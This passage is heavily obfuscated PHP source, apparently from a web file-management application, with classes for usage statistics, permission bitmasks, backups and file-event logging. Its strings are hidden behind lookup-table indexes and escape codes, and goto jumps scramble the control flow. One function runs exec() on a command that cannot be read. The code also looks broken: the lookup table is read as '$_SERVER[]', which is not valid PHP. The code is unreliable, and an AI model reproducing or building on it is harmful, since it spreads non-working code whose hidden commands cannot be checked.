Cޓټ; Cޓټ: $d렕 = array($C[29] => isset($Fԯ؍[$C[1368]]) ? $Fԯ؍[$C[1368]] : null, $C[77] => isset($Fԯ؍[$C[1369]]) ? $Fԯ؍[$C[1369]] : null, $C[206] => isset($Fԯ؍[$C[1370]]) ? $Fԯ؍[$C[1370]] : null, $C[1337] => isset($Fԯ؍[$C[1371]]) ? $Fԯ؍[$C[1371]] : null); $d렕[$C[1338]] = isset($Fԯ؍[$C[1372]]) ? strtotime($Fԯ؍[$C[1372]]) : $d렕[$C[1337]]; return $d렕; goto e; e: } protected function _isFolder($d΂) { $a銽 =& $_SERVER[]; if ($d΂ == $a銽[33] || $d΂ == $a銽[8]) { return !0; } $FЅ = $this->_objectMeta($d΂); return isset($FЅ[$a銽[29]]) && $FЅ[$a銽[29]] == $a銽[76] ? !0 : !1; } } goto a; A: class AnalysisModel extends ModelBaseLight { public function init($b) { $D =& $_SERVER[]; $c = array($D[557] => array($D[29] => $D[1612], $D[269] => array($D[220], $D[736], $D[1613], $D[1614])), $D[1615] => array($D[29] => $D[1616], $D[269] => array($D[220], $D[734], $D[1617], $D[1618], $D[1619]))); if (!isset($c[$b])) { return !1; } $this->optionType = $c[$b][$D[29]]; $this->field = $c[$b][$D[269]]; return !0; } public function listData($fɩ = false, $a͠ = "\155\x6f\x64\x69\146\171\x54\151\x6d\x65", $Aސ = false) { return parent::listData($fɩ, $a͠, $Aސ); } public function trendList($D) { goto Dۄό; eڤ̹: if (!isset($e)) { $e = $D == $Aɒ夺[557] ? $Aɒ夺[501] : $Aɒ夺[790]; $e = Model($e)->min($Aɒ夺[192]); } $A = $Aɒ夺[1622] . ucfirst($D); $e = $this->dateList($e); goto EƄ; EƄ: foreach ($e as $f쭩) { $this->{$A}($f쭩); } return $this->listData(); goto C; Dۄό: $Aɒ夺 =& $_SERVER[]; $E̸ = $this->listData(); if ($E̸) { $Aň = end($E̸); $f쭩 = date($Aɒ夺[1620], strtotime($Aɒ夺[1621])); if ($Aň[$Aɒ夺[220]] == $f쭩) { return $E̸; } $e = strtotime($Aň[$Aɒ夺[220]]); } goto eڤ̹; C: } private function dateList($F׋) { $b =& $_SERVER[]; $Bյ = $F׋; $e󰢮 = strtotime($b[1621]); $e = array(); while ($Bյ <= $e󰢮) { $e[] = date($b[1620], $Bյ); $Bյ = strtotime($b[1623], $Bյ); } return $e; } public function _recordUser($a = '') { goto cڢÅ°; cڢÅ°: $Eф虈 =& $_SERVER[]; $e = strtotime(date($Eф虈[1624], strtotime($a))); $eא = strtotime(date($Eф虈[1625], strtotime($a))); goto cܝ; cܝ: $c󈡵 = array($Eф虈[192] => array($Eф虈[970], $eא)); $Fӊ = Model($Eф虈[501])->where($c󈡵)->count($Eф虈[1523]); $c󈡵[$Eф虈[192]] = array($Eф虈[329], array($e, $eא)); goto f; f: $bº㊲ = Model($Eф虈[501])->where($c󈡵)->count($Eф虈[1523]); $c󈡵[$Eф虈[29]] = $Eф虈[1626]; $c͵ = Model($Eф虈[1627])->where($c󈡵)->count($Eф虈[1628]); goto a; a: $cڹ = array($Eф虈[220] => $a, $Eф虈[736] => (int) $Fӊ, $Eф虈[1613] => (int) $bº㊲, $Eф虈[1614] => (int) $c͵); return $this->insert($cڹ); goto F܆; F܆: } public function _recordStore($bຐ = '') { goto fв; fв: $f̠Ɣ =& $_SERVER[]; $aպ = strtotime(date($f̠Ɣ[1625], strtotime($bຐ))); $Eղ = array($f̠Ɣ[192] => array($f̠Ɣ[970], $aպ)); goto Dԧ; eӇҎף: $dܣő = Model($f̠Ɣ[790])->where($Eղ)->sum($f̠Ɣ[77]); $Eߐ = array($f̠Ɣ[220] => $bຐ, $f̠Ɣ[734] => (int) $d횴, $f̠Ɣ[1617] => (int) $bѷ, $f̠Ɣ[1618] => (int) $C, $f̠Ɣ[1619] => (int) $dܣő); return $this->insert($Eߐ); goto b∶ԯ; Dԧ: $bѷ = Model($f̠Ɣ[444])->where($Eղ)->sum($f̠Ɣ[77]); $Eղ[$f̠Ɣ[397]] = 0; $d횴 = Model($f̠Ɣ[790])->where($Eղ)->sum($f̠Ɣ[77]); goto cĔ; cĔ: $Eղ[$f̠Ɣ[398]] = 1; $C = Model($f̠Ɣ[790])->where($Eղ)->sum($f̠Ɣ[77]); $Eղ[$f̠Ɣ[398]] = 2; goto eӇҎף; b∶ԯ: } public function trend($F, $e) { goto D; E: if ($C᥶ && $e != $a䲱[1497]) { $E = $C᥶[0][$a䲱[220]]; $Dڜٝ = $this->validDate($e, $E); $Fτ = array(); $b = array_to_keyvalue($C᥶, $a䲱[220]); foreach ($Dڜٝ as $D넇) { if (isset($b[$D넇])) { $aϦ = $b[$D넇]; } else { $aϦ = end($C᥶); $aϦ[$a䲱[220]] = $D넇; if ($F == $a䲱[557]) { $aϦ[$a䲱[1613]] = $aϦ[$a䲱[1614]] = 0; } } $Fτ[] = $aϦ; } $C᥶ = $Fτ; } $fʕ̩ = array($a䲱[557] => array($a䲱[736] => LNG($a䲱[1629]), $a䲱[1613] => LNG($a䲱[1630]), $a䲱[1614] => LNG($a䲱[1631])), $a䲱[1615] => array($a䲱[734] => LNG($a䲱[1632]), $a䲱[1617] => LNG($a䲱[1633]), $a䲱[1618] => LNG($a䲱[1634]), $a䲱[1619] => LNG($a䲱[1635]))); $d = array($a䲱[557] => $a䲱[1636], $a䲱[1615] => $a䲱[77]); goto E; D: $a䲱 =& $_SERVER[]; if (!$this->init($F)) { return !1; } $C᥶ = $this->trendList($F); goto E; AÅ: return $a; goto e; E: if (empty($C᥶)) { $D넇 = date($a䲱[1620], strtotime($a䲱[1621])); $a = array($a䲱[220] => $D넇); foreach ($fʕ̩[$F] as $E => $Eɴ) { $a[$E] = 0; } $C᥶[] = $a; } $a = array(); foreach ($C᥶ as $Eɴ) { if ($F == $a䲱[1615] && $Eɴ[$a䲱[1617]] > $Eɴ[$a䲱[734]]) { $Eɴ[$a䲱[1617]] = $Eɴ[$a䲱[734]]; } foreach ($fʕ̩[$F] as $E => $d͈) { $aϦ = array($a䲱[220] => $Eɴ[$a䲱[220]], $a䲱[1428] => $d͈); $aϦ[$d[$F]] = isset($Eɴ[$E]) ? $Eɴ[$E] : 0; $a[] = $aϦ; } } goto AÅ; e: } public function validDate($Fۢ, $dА) { goto d噻; aّ: switch ($Fۢ) { case $Eͱ෫[1504]: $e۔ї = mktime(0, 0, 0, date($Eͱ෫[1637]), date($Eͱ෫[1249]) - date($Eͱ෫[1311]) + 7 - 7, date($Eͱ෫[1638])); $cޙ = 0; do { $fڴΔ = date($Eͱ෫[1620], $e۔ї - 3600 * 24 * 7 * $cޙ); $Aߩ[] = $fڴΔ; $cޙ++; } while ($dА < $fڴΔ); break; case $Eͱ෫[1502]: $cޙ = 1; do { $d毶 = date($Eͱ෫[1639], strtotime("\55\x20{$cޙ}\x20\x6d\157\x6e\x74\x68\x73")); $Aߩ[] = $d毶; $cޙ++; } while ($dА < $d毶); break; case $Eͱ෫[1640]: $b鞏 = (int) date($Eͱ෫[1638], strtotime($dА)); $A雦 = (int) date($Eͱ෫[1638]); if ($b鞏 >= $A雦) { break; } for ($b鞏; $b鞏 < $A雦; $b鞏++) { $Aߩ[] = $b鞏 . $Eͱ෫[1641]; } break; default: break; } if ($dА > end($Aߩ)) { array_pop($Aߩ); } sort($Aߩ); goto aϏ; d噻: $Eͱ෫ =& $_SERVER[]; $bҪͩ = date($Eͱ෫[1620], strtotime($Eͱ෫[1621])); $Aߩ = array($bҪͩ); goto aّ; aϏ: return $Aߩ; goto F; F: } public function listTable($BƼ) { $D陕 = ucfirst($BƼ); return Model($D陕)->listData(); } public function option($e؆) { $BР䕄 = $_SERVER[][1642] . ucfirst($e؆); return $this->{$BР䕄}(); } private function optionUser() { goto Dҽ; FΔ: $e٬ = intval($GLOBALS[$bېȃ[6]][$bېȃ[345]][$bېȃ[1482]]) / 3600; $bꌤ = strtotime("\55{$e٬}\40\x68\x6f\165\162\x73"); $a٩ = array($bېȃ[1644] => array($bېȃ[971], $bꌤ)); goto Aɿ; Dҽ: $bېȃ =& $_SERVER[]; $Aߩ = Model($bېȃ[501])->count($bېȃ[1523]); $CאӉ = Model($bېȃ[501])->where($bېȃ[1643])->count($bېȃ[1523]); goto FΔ; A҃: $a٩ = array($bېȃ[1644] => array($bېȃ[971], $bꌤ)); $eꦅ = Model($bېȃ[501])->where($a٩)->count($bېȃ[1523]); return array($bېȃ[731] => (int) $Aߩ, $bېȃ[1645] => (int) ($Aߩ - $CאӉ), $bېȃ[1646] => (int) $CאӉ, $bېȃ[1647] => (int) $eꦅ, $bېȃ[1648] => $F); goto aԕ; Aɿ: $F = (int) Model($bېȃ[501])->where($a٩)->count($bېȃ[1523]); if (!$F) { $F = 1; } $bꌤ = strtotime(date($bېȃ[1624])); goto A҃; aԕ: } private function optionFile() { goto f; b߅: $BƳǰ = Model($f[790])->where($DӦ)->sum($f[77]); $Aɑ = Model($f[790])->where($DӦ)->count($f[390]); return array($f[734] => $cƆմӡ, $f[1617] => $B۠Ǘ, $f[1649] => $cƆմӡ - $B۠Ǘ, $f[1650] => (int) $BƳǰ, $f[736] => (int) $c開ӽ, $f[1651] => (int) $Aɑ); goto a鎡萓; e: $B۠Ǘ = $AԌ[$f[1617]]; $c開ӽ = Model($f[790])->where(array($f[397] => 0))->count($f[390]); $DӦ = array($f[397] => 0, $f[192] => array($f[971], strtotime(date($f[1624])))); goto b߅; f: $f =& $_SERVER[]; $AԌ = $this->sourceSize(); $cƆմӡ = $AԌ[$f[77]]; goto e; a鎡萓: } private function optionAccess() { $AҸ =& $_SERVER[]; return array($AҸ[731] => $this->typeLogCnt(), $AҸ[106] => $this->typeLogCnt($AҸ[106]), $AҸ[424] => $this->typeLogCnt($AҸ[424]), $AҸ[1652] => $this->typeLogCnt($AҸ[1652]), $AҸ[1653] => $this->typeLogCnt($AҸ[1653]), $AҸ[557] => $this->typeLogCnt($AҸ[33], $AҸ[1628])); } private function typeLogCnt($Eއ = '', $EŲ = "\151\144") { goto fŰܦ; C̍: $f = array($Fĝ[192] => array($Fĝ[971], $Cѵع)); if ($Eއ) { $f[$Fĝ[29]] = array($Fĝ[7], $dףǍ[$Eއ]); } $Aܢ = Model($Fĝ[1627])->where($f)->count($EŲ); goto dЂ; fŰܦ: $Fĝ =& $_SERVER[]; $dףǍ = array($Fĝ[106] => array($Fĝ[1654], $Fĝ[1655]), $Fĝ[424] => array($Fĝ[1656], $Fĝ[1657]), $Fĝ[1652] => array($Fĝ[1658], $Fĝ[1659], $Fĝ[1660]), $Fĝ[1653] => array($Fĝ[1661], $Fĝ[1662]), $Fĝ[1663] => array($Fĝ[1664], $Fĝ[1665], $Fĝ[1666])); $Cѵع = strtotime(date($Fĝ[1624])); goto C̍; dЂ: return (int) $Aܢ; goto Cտ; Cտ: } private function optionServer() { goto Bп; Bп: $c栰 =& $_SERVER[]; $A򙈞 = $this->diskDriver(); $E = KodIO::defaultDriver(); goto Eɢ; Eɢ: $bж刿 = array($c栰[783] => $E[$c栰[388]]); $a̐ۊ = Model($c栰[444])->where($bж刿)->sum($c栰[77]); $D̵۷ = explode($c栰[50], $_SERVER[$c栰[141]]); goto Bي; A: return array($c栰[1669] => $A򙈞 ? $A򙈞[$c栰[1670]] : 0, $c栰[1671] => $A򙈞 ? $A򙈞[$c栰[1672]] : 0, $c栰[1673] => (int) $E[$c栰[1670]] * 1024 * 1024 * 1024, $c栰[1674] => (int) $a̐ۊ, $c栰[1675] => ucfirst($D), $c栰[1676] => $c栰[1677] . PHP_VERSION, $c栰[1678] => phpBuild64() ? 64 : 32, $c栰[730] => str_replace($c栰[1679], $c栰[948], $Eʮ), $c栰[345] => ucfirst($cܯ), $c栰[28] => $_SERVER[$c栰[1680]]); goto E鰺; cߑ: if ($Eʮ == $c栰[761]) { $DϨ = explode($c栰[1164], $fщ[$c栰[931]]); $Eʮ = $DϨ[0]; } if ($Eʮ == $c栰[764] || $Eʮ == $c栰[765]) { $Bè = Model()->db()->query($c栰[1667]); $eö = $Bè[0] && isset($Bè[0][$c栰[1427]]) ? $Bè[0][$c栰[1427]] : 0; $Eʮ = $c栰[1668] . ($eö ? $c栰[8] . $eö : $c栰[33]); } $cܯ = $GLOBALS[$c栰[6]][$c栰[345]][$c栰[800]]; goto A; Bي: $D = $D̵۷[0]; $fщ = $GLOBALS[$c栰[6]][$c栰[17]]; $Eʮ = $fщ[$c栰[932]]; goto cߑ; E鰺: } private function diskDriver() { goto BႾβ; b: if ($B) { $cװ = $B޽ʿ[1683]; if (function_exists($B޽ʿ[1684])) { exec($B޽ʿ[1685], $Fۈ); $cװ = $Fۈ[1] . $B޽ʿ[8]; } } if (!file_exists($cװ)) { return; } $cц = @disk_total_space($cװ); goto e٦; BႾβ: $B޽ʿ =& $_SERVER[]; $cװ = $B޽ʿ[8]; $B = $GLOBALS[$B޽ʿ[6]][$B޽ʿ[1681]] == $B޽ʿ[1682]; goto b; e٦: $Eբ = $cц - @disk_free_space($cװ); return array($B޽ʿ[1670] => $cц, $B޽ʿ[1672] => $Eբ); goto ä; ä: } public function fileChart($dԌʈض) { goto d󔕒ؽ; d󔕒ؽ: $a릑 =& $_SERVER[]; if (isset($dԌʈض[$a릑[1523]])) { return Model($a릑[790])->userFileTypeProfile($dԌʈض[$a릑[1523]]); } if (isset($dԌʈض[$a릑[1686]])) { return Model($a릑[790])->groupFileTypeProfile($dԌʈض[$a릑[1686]]); } goto Cӝʑ; C𐘗: $f[$a릑[398]] = 2; $a = Model($a릑[790])->where($f)->sum($a릑[77]); return array($a릑[734] => $A䗚[$a릑[77]], $a릑[1617] => $A䗚[$a릑[1617]], $a릑[1618] => (int) $FǍ, $a릑[1619] => (int) $a); goto fͲ; Cӝʑ: $A䗚 = $this->sourceSize(); $f = array($a릑[472] => 0, $a릑[398] => 1); $FǍ = Model($a릑[790])->where($f)->sum($a릑[77]); goto C𐘗; fͲ: } private function sourceSize() { $Dܤ =& $_SERVER[]; $Dڅȥ = Model($Dܤ[790])->where(array($Dܤ[397] => 0))->sum($Dܤ[77]); $aŢӹ = Model($Dܤ[444])->sum($Dܤ[77]); if ($aŢӹ > $Dڅȥ) { $aŢӹ = $Dڅȥ; } return array($Dܤ[77] => (int) $Dڅȥ, $Dܤ[1617] => (int) $aŢӹ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $D =& $_SERVER[]; $Dӽ = array(array($D[407] => LNG($D[1687]), $D[1688] => $D[1689], $D[1690] => 1, $D[1691] => 1, $D[1692] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($D[407] => LNG($D[1693]), $D[1688] => $D[1694], $D[1690] => 2, $D[1691] => 1, $D[1692] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($D[407] => LNG($D[1695]), $D[1688] => $D[1696], $D[1690] => 3, $D[1691] => 1, $D[1692] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($D[407] => LNG($D[1697]), $D[1688] => $D[1698], $D[1690] => 4, $D[1691] => 1, $D[1692] => self::AUTH_SHOW | self::AUTH_VIEW), array($D[407] => LNG($D[1699]), $D[1688] => $D[1700], $D[1690] => 5, $D[1691] => 1, $D[1692] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($D[407] => LNG($D[1701]), $D[1688] => $D[1702], $D[1690] => 6, $D[1691] => 1, $D[1692] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($D[407] => LNG($D[1703]), $D[1688] => $D[1704], $D[1690] => 7, $D[1691] => 1, $D[1692] => 0)); return $Dӽ; } public static function authCheck($B, $f) { $B = intval($B); if ($GLOBALS[$_SERVER[][479]]) { return !0; } if ($B <= 0) { return !1; } if (($B & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($B & $f); } public static function authCheckShow($F) { return self::authCheck($F, self::AUTH_SHOW); } public static function authCheckView($C) { return self::authCheck($C, self::AUTH_VIEW); } public static function authCheckDownload($Eߙ) { return self::authCheck($Eߙ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($f) { return self::authCheck($f, self::AUTH_UPLOAD); } public static function authCheckEdit($dދҜ) { return self::authCheck($dދҜ, self::AUTH_EDIT); } public static function authCheckRemove($cԯ) { return self::authCheck($cԯ, self::AUTH_REMOVE); } public static function authCheckShare($aѨ) { return self::authCheck($aѨ, self::AUTH_SHARE); } public static function authCheckComment($a) { return self::authCheck($a, self::AUTH_COMMENT); } public static function authCheckEvent($aх) { return self::authCheck($aх, self::AUTH_EVENT); } public static function authCheckRoot($b򠘎) { return self::authCheck($b򠘎, self::AUTH_ROOT); } public static function authCheckAction($A, $EǮ) { goto e; bȏ: $f͔ = $e뻯[$EǮ]; $A = intval($A); if ($A <= 0) { return !1; } goto f; e: $D =& $_SERVER[]; $e뻯 = array($D[1705] => self::AUTH_VIEW, $D[1093] => self::AUTH_DOWNLOAD, $D[106] => self::AUTH_UPLOAD, $D[1653] => self::AUTH_EDIT, $D[1652] => self::AUTH_REMOVE, $D[1663] => self::AUTH_SHARE, $D[350] => self::AUTH_COMMENT, $D[1512] => self::AUTH_EVENT, $D[1706] => self::AUTH_ROOT); if (!isset($e뻯[$EǮ])) { return; } goto bȏ; f: if (($A & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A & $f͔); goto AŨ; AŨ: } public static function authDisable($B, $fߌ) { if (intval($B) <= 0) { return 0; } return intval($B) & ~$fߌ; } public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x73\x6f\165\x72\x63\145\101\x75\164\x68\x4c\x69\x73\x74"; public $field = array("\156\x61\155\145", "\141\165\x74\150", "\x6c\x61\142\x65\154", "\x64\151\163\x70\x6c\141\x79", "\x73\x79\163\164\x65\155", "\x73\x6f\162\x74"); public function initData() { $Dı = $this->authDefault(); foreach ($Dı as $b) { $this->add($b); } } public function listData($Fאψ = false, $Eá = "\163\x6f\x72\164", $fߠ = false) { return parent::listData($Fאψ, $Eá, $fߠ); } public function update($D, $e˝ǌ) { $b䇆 =& $_SERVER[]; $b = parent::listData($D); $f = $this->findByName($e˝ǌ[$b䇆[28]]); if (!$b || $f && $f[$b䇆[388]] != $b[$b䇆[388]]) { return !1; } $this->filterAuth($e˝ǌ[$b䇆[400]]); return parent::update($D, $e˝ǌ); } public function remove($cӶ) { $f = parent::listData($cӶ); if (!$f || $f[$_SERVER[][1168]]) { return !1; } return parent::remove($cӶ); } public function add($bΘ܍ = array()) { goto c; d: $bΘ܍ = array_merge($E, $bΘ܍); $bΘ܍[$fы[1709]] = $this->getSort(); $this->filterAuth($bΘ܍[$fы[400]]); goto fª; fª: return parent::insert($bΘ܍); goto eȳ; c: $fы =& $_SERVER[]; if ($this->findByName($bΘ܍[$fы[28]])) { return !1; } $E = array($fы[28] => $fы[33], $fы[400] => 1, $fы[1707] => $fы[1696], $fы[1708] => 1, $fы[1168] => 0, $fы[1709] => 0); goto d; eȳ: } private function getSort() { $Fӏ =& $_SERVER[]; $Cƨ = parent::listData(); $Cϕ꯲ = array_to_keyvalue($Cƨ, $Fӏ[33], $Fӏ[1709]); return empty($Cϕ꯲) ? 0 : max($Cϕ꯲) + 1; } private function filterAuth(&$Eţ񹕃) { goto A̵; A̵: if (!$Eţ񹕃) { return; } $b = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $f = array(); goto C׶; F: foreach ($f as $B񦡭) { if (isset($C緕Ǵ[$B񦡭])) { $f = array_merge($f, $C緕Ǵ[$B񦡭]); } } $f[] = self::AUTH_SHOW; $Eţ񹕃 = array_sum(array_unique($f)); goto E; C׶: foreach ($b as $B񦡭) { if ($Eţ񹕃 & $B񦡭) { $f[] = $B񦡭; } } if (in_array(self::AUTH_ROOT, $f)) { $Eţ񹕃 = array_sum($b); return; } $C緕Ǵ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto F; E: } public function sort($A, $cͲچ) { return parent::update($A, $cͲچ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\142\x61\x63\x6b\165\x70\114\151\163\164"; public $field = array("\151\157", "\x6e\141\x6d\x65", "\x73\x74\x61\x74\x75\x73", "\143\x6f\x6e\164\145\156\x74", "\x72\x65\x73\165\x6c\164", "\164\151\155\145\106\x72\x6f\155", "\x74\151\155\145\x54\157"); public function config() { goto d; E͂: $f׊ = is_array($f׊) ? $f׊ : array(); if (!isset($f׊[$C[728]])) { $f׊[$C[728]] = $C[86]; } $a = array(); goto fت; d: $C =& $_SERVER[]; $f׊ = Model($C[1123])->get($C[749]); $f׊ = json_decode($f׊, !0); goto E͂; fت: Action($C[1710])->taskInit(); $Dҝ = Model($C[1711])->listData(); foreach ($Dҝ as $fҜȔτ) { if ($fҜȔτ[$C[1168]] == $C[86] && $fҜȔτ[$C[1512]] == $C[1712]) { $a = $fҜȔτ; break; } } goto b; b: if (isset($a[$C[195]])) { $a[$C[195]] = json_decode($a[$C[195]], !0); } if (isset($f׊[$C[195]])) { $a[$C[195]][$C[1497]] = $f׊[$C[195]]; unset($f׊[$C[195]]); } return array_merge($a, $f׊); goto eێ; eێ: } public function listData($C忨 = false, $aү = "\x6d\157\x64\x69\146\171\x54\x69\155\x65", $a = false) { return parent::listData($C忨, $aү, !0); } public function lastItem() { $Aلń = $this->listData(); return !empty($Aلń[0]) ? $Aلń[0] : null; } public function kill($f㟥) { goto f; FШ: $Fʠ = $B׳ԣ[$fƠ[28]]; $B = TEMP_FILES . $fƠ[745] . $Fʠ . $fƠ[8]; IO::remove($B, !1); goto F枼; F枼: return $this->remove($f㟥); goto e; f: $fƠ =& $_SERVER[]; $B׳ԣ = $this->listData($f㟥); if (!$B׳ԣ || empty($B׳ԣ[$fƠ[28]])) { return !0; } goto C; C: Task::kill($fƠ[748]); Task::kill($fƠ[767]); Task::kill($fƠ[776]); goto FШ; e: } public function remove($d) { $e = $this->listData($d); if (!$e) { return !0; } return $this->backupRemove($e); } private function backupRemove($a爐) { $b =& $_SERVER[]; parent::remove($a爐[$b[388]]); $cγ = "\173\151\157\72{$a爐[$b[727]]}\x7d\x2f\144\141\164\x61\142\141\x73\145\57\142\x61\143\153\165\x70\137" . $a爐[$b[28]]; IO::remove($cγ, !1); return !0; } public function start() { goto A; b؄: if (!$cΦ || $cΦ[$aǬܡ[1494]] != $aǬܡ[86]) { return !1; } $aҭ = $this->process(); foreach ($aҭ as $aꄛ) { if ($aꄛ) { return Task::restart($aꄛ[$aǬܡ[388]]); } } goto dѠ; dѠ: $f = new Backup(); $f->keep(); $EЭ = $f->db(); goto C; C: if ($EЭ) { $EЭ = $f->dbFile(); if ($EЭ && $cΦ[$aǬܡ[728]] == $aǬܡ[491]) { $EЭ = $f->file(); } } Backup::set(array($aǬܡ[725] => 1, $aǬܡ[470] => time())); return !0; goto AԐ; A: $aǬܡ =& $_SERVER[]; if ($GLOBALS[$aǬܡ[6]][$aǬܡ[87]][$aǬܡ[1713]] != $aǬܡ[86]) { return !0; } $cΦ = $this->config(); goto b؄; AԐ: } public function process() { $B =& $_SERVER[]; return array($B[730] => Task::get($B[748]), $B[733] => Task::get($B[767]), $B[173] => Task::get($B[776])); } public function restore() { $Eҝћ =& $_SERVER[]; ActionCall($Eҝћ[1018], !0, 1); ActionCall($Eҝћ[1018], !0, 0); } } goto D; fʹ烏: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\x63\145\x5f\x65\x76\x65\156\164"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\145\x54\151\155\x65", "\164\151\155\145", "\151\156\x73\x65\162\164", "\x66\165\x6e\x63\x74\x69\x6f\x6e"), array("\144\x65\163\143", '', "\151\156\x73\145\x72\164\54\x75\x70\x64\141\x74\145\54\163\x65\154\145\x63\164", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($aւ姐١, $B, $E챫 = '') { goto fˍΉ; E낐: if (!$Cؽߐ) { return !1; } if ($this->isCacheEvent($Cؽߐ, $B)) { return; } if ($E챫 && is_string($E챫)) { $E챫 = array($a[1719] => $E챫); } goto aᣋ; aᣋ: $f = array($a[404] => $aւ姐١, $a[1895] => $Cؽߐ[$a[472]], $a[1896] => $Cؽߐ[$a[28]], $a[489] => $Cؽߐ[$a[489]], $a[1515] => USER_ID, $a[409] => $B, $a[1517] => $E챫); $this->addSystemLog($B, $f); return $this->add($f); goto fÒ; fˍΉ: $a =& $_SERVER[]; if (!$this->eventSave) { return; } $Cؽߐ = Model($a[1203])->sourceInfo($aւ姐١); goto E낐; fÒ: } private function addSystemLog($dÐ隠, $F蹏С) { $Eȸ =& $_SERVER[]; if ($dÐ隠 == $Eȸ[1897]) { $dÐ隠 = $F蹏С[$Eȸ[425]][$Eȸ[1898]]; } else { if (in_array($dÐ隠, array($Eȸ[1663], $Eȸ[1899]))) { $dÐ隠 = $F蹏С[$Eȸ[425]][$Eȸ[728]]; } } $d = array_merge($F蹏С, array($Eȸ[1900] => $F蹏С[$Eȸ[390]], $Eȸ[1901] => $F蹏С[$Eȸ[1901]])); Model($Eȸ[1627])->addLog($Eȸ[1902] . $dÐ隠, $d); } private function isCacheEvent($f, $Dﰝ㍵) { if ($f[$_SERVER[][398]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($F⧪ҝ, $eȷ) { $D鋝 =& $_SERVER[]; $b = Model($D鋝[1203])->sourceInfo($F⧪ҝ); $C = array($D鋝[1898] => $eȷ, $D鋝[28] => $b[$D鋝[28]]); return $this->addEvent($F⧪ҝ, $D鋝[1897], $C); } public function eventFileEdit($f) { $D֤ =& $_SERVER[]; $b׶ح = array($D֤[1903] => $_SERVER[$D֤[1904]], $D֤[1905] => strtolower(ACTION)); return $this->addEvent($f, $D֤[1653], $b׶ح); } public function eventRecycle($bÊ, $b셭) { return $this->addEvent($bÊ, $_SERVER[][1899], $b셭); } public function eventRemove($cר) { $dˉߎ =& $_SERVER[]; $D񯚱 = Model($dˉߎ[1203])->sourceInfo($cר); $b욝 = $D񯚱[$dˉߎ[28]]; return $this->addEvent($D񯚱[$dˉߎ[472]], $dˉߎ[1652], $b욝); } public function eventShare($F΃, $b걟) { return $this->addEvent($F΃, $_SERVER[][1663], $b걟); } public function eventMove($E݌, $b􅉨, $CΑ) { goto BФ; BФ: $Až =& $_SERVER[]; $C = Model($Až[1203]); $C = $C->sourceInfo($E݌); goto f; f: $B = $C->sourceInfo($b􅉨); $d = $C->sourceInfo($CΑ); $fӢ = array($Až[1054] => $b􅉨, $Až[1906] => $B[$Až[28]], $Až[1886] => $B[$Až[489]], $Až[1055] => $CΑ, $Až[1907] => $d[$Až[28]], $Až[1908] => $d[$Až[489]]); goto D; a渠: $this->addEvent($b􅉨, $Až[1909], $fӢ); goto Cє; D: $this->addEvent($E݌, $Až[515], $fӢ); $C = $C->sourceInfo($E݌); $fӢ = array($Až[390] => $C[$Až[390]], $Až[28] => $C[$Až[28]]); goto a渠; Cє: } public function eventCopy($Dڅ) { $this->eventCreate($Dڅ, $_SERVER[][513]); } public function eventRename($Aي, $C, $A) { $E٭ =& $_SERVER[]; $AӘՎ = array($E٭[1054] => $C, $E٭[1055] => $A); return $this->addEvent($Aي, $E٭[1216], $AӘՎ); } public function eventAddComment($a, $c) { return $this->addEvent($a, $_SERVER[][1910], $c); } public function eventAddDesc($f, $BԳî) { return $this->addEvent($f, $_SERVER[][1911], $BԳî); } public function listBySource($fաͳ) { goto F֦; Bٓ: return $this->eventListParse($Cͅ, $fաͳ); goto D؋ڎ; F֦: $bѣ =& $_SERVER[]; $Bڒ = Model($bѣ[1203])->sourceInfo($fաͳ); $E߷ = array($bѣ[404] => $fաͳ); goto cŰ; cŰ: if ($Bڒ[$bѣ[397]] == $bѣ[86]) { $d = Model($bѣ[1203])->listSearchChildren($fաͳ, 20000); $d[] = $fաͳ . $bѣ[373]; $E߷ = array($bѣ[390] => array($bѣ[7], $d)); } $Cͅ = $this->where($E߷)->order($bѣ[1912])->selectPage(); if ($Cͅ[$bѣ[362]][$bѣ[363]] == 0) { 